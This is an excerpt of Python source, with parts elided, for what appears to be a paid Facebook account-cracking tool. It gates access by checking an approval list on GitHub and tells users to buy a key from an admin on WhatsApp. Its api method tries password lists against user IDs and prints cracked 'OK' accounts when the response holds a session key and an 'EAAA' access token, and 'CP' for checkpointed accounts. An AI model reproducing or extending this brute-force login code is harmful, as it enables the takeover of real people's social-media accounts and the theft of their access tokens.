...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/ved.baghel.39")

def notice():

 

	runtxt("\n\033[0;91m TOOLS KO BUY KRO OK ID K LIAY")

	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))

	runtxt("\033[0;92m ADMIN WHATSAPP >> 4DEEL")
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/4deeL-khan/LGBRAND/main/Approval.txt').text
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r%s[4DEEL ] : %s/%s -> \033[0;92m [OK:%s] \033[0;93m[CP:%s]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r\033[0;92m[4DEEL -OK] %s | %s\033[0;97m         "%(uid, pw))
				...
				print("\r\033[0;93m[4DEEL -CP] %s | %s\033[0;97m         "%(uid, pw))
